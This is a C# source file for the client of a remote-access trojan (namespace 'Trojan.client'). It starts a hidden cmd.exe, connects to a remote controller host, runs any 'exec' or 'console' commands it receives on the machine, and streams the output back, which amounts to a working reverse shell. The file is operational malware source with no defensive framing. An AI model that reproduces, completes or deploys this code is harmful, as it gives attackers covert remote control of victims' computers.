using System;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;
using SocketData;
using Trojan.exceptions;

namespace Trojan.client
{
    public class Client : SocketHandler
    {
        public class TCPShell
        {
            private Process _ShellProcess = new Process();

            public StreamWriter InputStream;
            public StreamReader OutputStream;
            public StreamReader ErrorStream;
            
            public TCPShell()
            {
                ProcessStartInfo _ShellStartInfo = new ProcessStartInfo();

                _ShellStartInfo.FileName = "cmd.exe";
                _ShellStartInfo.UseShellExecute = false;

                _ShellStartInfo.RedirectStandardInput = true;
                _ShellStartInfo.RedirectStandardOutput = true;
                _ShellStartInfo.RedirectStandardError = true;
               
                _ShellProcess.StartInfo = _ShellStartInfo;

                _ShellProcess.Start();

                InputStream = _ShellProcess.StandardInput;
                OutputStream = _ShellProcess.StandardOutput;
                ErrorStream = _ShellProcess.StandardError;

                InputStream.Flush();
                OutputStream.DiscardBufferedData();
                ErrorStream.DiscardBufferedData();
            }
        }

        public socketSetup Connector;

        public async Task Send_Socket(Socket sock, string message, int SendTimeout)
        {
            if (sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(sock));

            await sock.SendAsync(Encoding.UTF8.GetBytes(message), SocketFlags.None);
        }

        public async Task Receive_Socket(socketSetup socketSetup, int ReceiveTimeout)
        {
            if (socketSetup.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(socketSetup.sock));

            byte[] tmpBuffer = new byte[socketSetup.buffSize];

            Task ReceiveTask = socketSetup.sock.ReceiveAsync(tmpBuffer, SocketFlags.None);

            if (await Task.WhenAny(ReceiveTask, Task.Delay(ReceiveTimeout)) == ReceiveTask)
            {
                string message = Encoding.UTF8.GetString(tmpBuffer).Replace("\0", "");
                if (tmpBuffer.Length > 0 && message.Length > 0)
                {
                    Console.WriteLine("\n[+] [{0}] Received_MessageFromServer[{1}] -- Message_Length[{2} characters] ;", socketSetup.getUUID(), message, message.Length);
                    socketSetup.buffer = tmpBuffer;

                    if (TruncationCheckCommand(message, 0, 4) == "exec")
                    {
                        string command_parsed = CommandExtension.CheckForCommand(message);
                        if (command_parsed != "")
                        {
                            string Command_Data = CommandExtension.ExecuteCommand(command_parsed);
                            await Send_Socket(socketSetup.sock, Command_Data, SEND_TIMEOUT);
                        }
                        else if (command_parsed == "" && ReceiveTimeout == Timeout.Infinite)
                        {
                            await Send_Socket(socketSetup.sock, "\t[|] Command failed " + "[" + message + "]" + " [" + socketSetup.getUUID() + "]", SEND_TIMEOUT);
                        }

                        await Send_Socket(socketSetup.sock, "<EODM>", SEND_TIMEOUT);
                    }
                    else if (TruncationCheckCommand(message, 0, 7) == "console")
                    {
                        string TCPShell_Command = message.Substring(7);

                        tcpShell.InputStream.WriteLine(TCPShell_Command);
                        tcpShell.InputStream.WriteLine("<EOF>");
                        tcpShell.InputStream.Flush();

                        StringBuilder OutputData = new StringBuilder();

                        string? line;
                        while(true)
                        {
                            line = tcpShell.OutputStream.ReadLine();
                            if (line.EndsWith("<EOF>")) { break; }

                            OutputData.AppendLine("\t" + line);
                        }

                        if (OutputData.Length > BUFFSIZE)
                        {
                            StringBuilder split_OutputData = new StringBuilder((int)(BUFFSIZE));

                            int offset = 0;
                            int dataLeft = 0;
                            int charsRead = 1024;
                            while (offset < OutputData.Length)
                            {
                                split_OutputData.Clear();
                                dataLeft = OutputData.Length - offset;

                                if (dataLeft < 1024)
                                    charsRead = dataLeft;

                                split_OutputData.Append(StringExtensions.PartitionAsString(OutputData.ToString().Substring(offset, charsRead), charsRead));

                                offset += charsRead;

                                await Send_Socket(socketSetup.sock, split_OutputData.ToString(), SEND_TIMEOUT);
                            }
                        }
                        else
                        {
                            await Send_Socket(socketSetup.sock, OutputData.ToString(), SEND_TIMEOUT);
                        }

                        await Send_Socket(socketSetup.sock, "<EODM>", SEND_TIMEOUT);
                    }

                    if (ReceiveTimeout == Timeout.Infinite) { await Receive_Socket(socketSetup, ReceiveTimeout); }
                }
                else
                {
                    throw new ExceptionHandler("[-] ReceiveTask timed out : " + nameof(ReceiveTask));
                }
            }
        }

        public async Task Init_Client(ushort port, uint buffSize)
        {
            if (HOST != null)
            {
                Connector = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
                await _SocketOperations.Connect_Socket(Connector);
                Task ConnectorReceiver = Task.Factory.StartNew(() => Receive_Socket(Connector, Timeout.Infinite));
            }
        }

        public TCPShell tcpShell = new TCPShell();
        public static async Task Main()
        {
            Client client = new Client();
            await client.Init_Client(PORT, BUFFSIZE);

            while (true)
            {

            }
        }
    }
}
